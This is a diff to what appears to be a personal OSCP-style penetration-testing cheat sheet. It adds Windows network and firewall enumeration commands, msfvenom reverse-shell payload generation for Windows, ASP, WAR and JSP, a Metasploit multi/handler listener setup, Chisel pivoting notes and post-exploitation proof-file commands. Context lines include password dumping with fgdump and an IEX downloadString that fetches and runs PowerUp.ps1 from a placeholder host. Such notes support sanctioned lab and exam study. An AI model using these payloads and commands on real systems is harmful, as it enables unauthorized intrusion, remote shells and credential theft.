@@ -288,6 +288,20 @@ C:\> fgdump.exe
 C:\> type 127.0.0.1.pwdump
 ```
 
+### Network
+```bash
+#check ports that are alr opened
+netstat -ano
+
+#check host -  IP address associated with a hostname, bypassing the DNS lookup process.
+C:\WINDOWS\System32\drivers\etc\hosts
+
+#check firewall
+netsh firewall show state
+netsh firewall show config
+netsh dump
+```
+
 ### Use Powerup https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
 ```bash
 IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/PowerUp.ps1')
@@ -708,8 +722,32 @@ python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 
 # MISC
 
-## MSFVenom Reverse Shell Payload Cheatsheet (see stageless)
-### https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ 
+## MSFVenom
+
+### Check msfvenom payloads
+```bash
+msfvenom -l payloads
+```
+
+###
+```bash
+msfconsole
+use exploit/multi/handler
+set lhost x.x.x.x
+set Iport 4444
+exploit
+
+#windows (stageless)
+msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > shell.asp
+
+#Linux (stageless)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f war > shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > shell.jsp
+```
+
+### MSFVenom Reverse Shell Payload Cheatsheet (see stageless)
+- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ 
 ```bash 
 #Non-Meterpreter Binaries
 
@@ -791,9 +829,9 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 | echo -n “base64-output” > file	| Decoding the base64 output of the file |
 
 ## Pivoting for lateral movement
-### https://blog.mkiesel.ch/posts/oscp_pivoting/
-### https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot
-#### Using Chisel
+### Using Chisel
+- https://blog.mkiesel.ch/posts/oscp_pivoting/
+- https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot
 
 ```bash
 #On your attacking machine (192.168.60.200) setup a Chisel server with:
@@ -830,4 +868,14 @@ apt install mingw-w64
 i686-w64-mingw32-gcc /usr/share/exploitdb/exploits/windows/dos/42341.c -o syncbreeze_exploit.exe -lws2_32
 ```
 
+## Post exploitation evidence
+```bash
+cat /root/proof.txt
+whoami
+ip a
 
+type local.txt
+type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
+systeminfo
+ipconfig
+```
